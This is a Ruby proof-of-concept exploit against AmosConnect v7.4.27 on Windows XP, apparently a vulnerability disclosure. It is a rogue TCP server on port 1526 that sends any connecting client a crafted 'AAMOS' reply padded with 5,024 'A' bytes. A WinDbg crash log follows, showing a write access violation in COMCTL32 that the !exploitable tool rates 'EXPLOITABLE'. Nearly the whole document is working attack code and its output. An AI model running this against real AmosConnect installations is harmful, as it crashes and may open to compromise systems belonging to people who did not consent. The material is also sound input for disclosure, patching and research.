#!/usr/bin/env ruby
# AmosConnect v7.4.27 (Remote/Send TCP/IP Mail...) WindowXP
require 'rex'
require 'socket'

server = TCPServer.new 1526 

loop do
  stringz = "A" * 5024
  data = "AAMOS|8.0|#{stringz}||0|4294967295|1|"
  buff = [data.size - 1].pack('v') + data
  client = server.accept
  res = client.recv(1024)
  client.puts(buff)
end
__END__
(bf8.bfc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00c790cc ebx=7e42af56 ecx=40010444 edx=00000040 esi=00153250 edi=7e42929a
eip=5d0c373e esp=0012d060 ebp=0012d090 iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010293
COMCTL32!EditPropSheetTemplate+0x50:
5d0c373e 8908            mov     dword ptr [eax],ecx  ds:0023:00c790cc=90c800c0
0:000> kv
ChildEBP RetAddr  Args to Child              
0012d090 5d0c3a55 00c790c0 0012d0b0 00000000 COMCTL32!EditPropSheetTemplate+0x50 (FPO: [Non-Fpo])
0012d0d0 5d0c3b40 00167728 00153250 00140036 COMCTL32!_CreatePageDialog+0x1e (FPO: [Non-Fpo])
0012d0f0 5d0c5ea7 00167728 00153250 00140036 COMCTL32!_CreatePage+0x3f (FPO: [Non-Fpo])
0012d30c 5d0c78b6 00167728 00000001 00120142 COMCTL32!PageChange+0xcc (FPO: [Non-Fpo])
0012d6cc 5d0c839e 00140036 00167728 0012d7a4 COMCTL32!InitPropSheetDlg+0xbd1 (FPO: [Non-Fpo])
0012d73c 7e418734 00140036 00000110 00120142 COMCTL32!PropSheetDlgProc+0x465 (FPO: [Non-Fpo])
0012d768 7e423ce4 5d0c7f39 00140036 00000110 USER32!InternalCallWinProc+0x28
0012d7d4 7e423b30 00000000 5d0c7f39 00140036 USER32!UserCallDlgProcCheckWow+0x146 (FPO: [Non-Fpo])
0012d81c 7e421d9a 00000000 00000110 00120142 USER32!DefDlgProcWorker+0xa8 (FPO: [Non-Fpo])
0012d84c 7e42651a 006dfc70 006f0ed8 00120142 USER32!SendMessageWorker+0x448 (FPO: [Non-Fpo])
0012d904 7e42683e 00000000 006dfc70 00000100 USER32!InternalCreateDialog+0x9df (FPO: [Non-Fpo])
0012d928 7e43f03a 5d090000 001679c0 00050166 USER32!CreateDialogIndirectParamAorW+0x33 (FPO: [Non-Fpo])
0012d948 5d0c8a04 5d090000 001679c0 00050166 USER32!CreateDialogIndirectParamW+0x1b (FPO: [Non-Fpo])
0012d9ac 5d0c8c55 00030256 000001a0 004bba60 COMCTL32!_RealPropertySheet+0x242 (FPO: [Non-Fpo])
0012d9c4 5d0c8c70 0012da60 00000000 0012d9e0 COMCTL32!_PropertySheet+0x138 (FPO: [Non-Fpo])
*** WARNING: Unable to verify checksum for image00400000
*** ERROR: Module load completed but symbols could not be loaded for image00400000
0012d9d4 0047658e 0012da60 0012dc60 00416f6b COMCTL32!PropertySheetW+0xf (FPO: [Non-Fpo])
WARNING: Stack unwind information not available. Following frames may be wrong.
0012d9e0 00416f6b 0012da60 0012dab0 004bba60 image00400000+0x7658e
0012dc60 0045d834 00050166 0012e590 0045cd8e image00400000+0x16f6b
0012e528 7e418734 00050166 00000111 000013c3 image00400000+0x5d834
0012e554 7e418816 0045cd8e 00050166 00000111 USER32!InternalCallWinProc+0x28
0:000> !load msec
0:000> !exploitable
*** WARNING: Unable to verify checksum for C:\Program Files\AmosConnect\MSSAPI32.dll
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\AmosConnect\MSSAPI32.dll - 
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at COMCTL32!EditPropSheetTemplate+0x0000000000000050 (Hash=0x20522e02.0x5d49485f)

User mode write access violations that are not near NULL are exploitable.

